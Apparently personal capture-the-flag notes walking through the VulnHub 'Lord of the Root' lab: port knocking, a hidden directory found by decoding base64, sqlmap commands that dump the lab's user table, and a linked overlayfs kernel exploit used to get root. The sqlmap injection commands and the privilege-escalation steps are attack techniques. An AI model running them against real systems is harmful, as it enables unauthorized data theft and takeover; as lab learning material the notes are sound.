@@ -1,0 +1,53 @@
+https://www.vulnhub.com/entry/lord-of-the-root-101,129/
+Port knocking is a process of knocking the secquence of ports in order to open a new process or the new port
+in this scenerio i if we knock the ports 1,2,3 ==> leads to a new http web server hosted in the hidden machine.
+
+enumiration of directories had given some stuff but a lead is there is the directory "/geoda" cant be found with any wordlists as of now
+
+there is page in the directory containing the base64 encoded text and the decode output twice [*2] gives /978345210/index.php as the username password directory. 
+
+now i have to enumirate the usernmame and password inorder to get access to the machine
+
+
+enumirating the username and password using sqlmap [because the site is vulnerable to the sql injection ]
+sqlmap -u 'http://10.38.1.117:1337/978345210/index.php' --data='username=username&password=password&submit=' --level=5 --risk=3
+sqlmap -u 'http://10.38.1.117:1337/978345210/index.php' --data='username=username&password=password&submit=' --level=5 --risk=3 --dbs
+	> Outputs ->
+		available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] Webapp
+
+sqlmap -u 'http://10.38.1.117:1337/978345210/index.php' --data='username=username&password=password&submit=' --level=5 --risk=3 -D Webapp -T Users --dump
+
+	> Output ->
+Database: Webapp
+Table: Users
+[5 entries]
++----+------------------+----------+
+| id | password         | username |
++----+------------------+----------+
+| 1  | iwilltakethering | frodo    |
+| 2  | MyPreciousR00t   | smeagol  |
+| 3  | AndMySword       | aragorn  |
+| 4  | AndMyBow         | legolas  |
+| 5  | AndMyAxe         | gimli    |
++----+------------------+----------+
+
+login to ssh for the user (2) and the version used by ubuntu is something which is vulnerable to overlayfs.
+
+https://www.exploit-db.com/exploits/39166/ -> save the script .c and run it using gcc esclates the previlage
+
+
+FLAG:
+root@LordOfTheRoot:/root# cat Flag.txt 
+“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+– Gandalf
+root@LordOfTheRoot:/root# 
+
+
+Further learning :
+1 ->  Learn the exploit what overlayfs mean
+2 ->  Learn SQL injection and sql map		
+3 ->  Port knocking , how do we automatically test a set of ports and sequences to unlock the hidden ports.
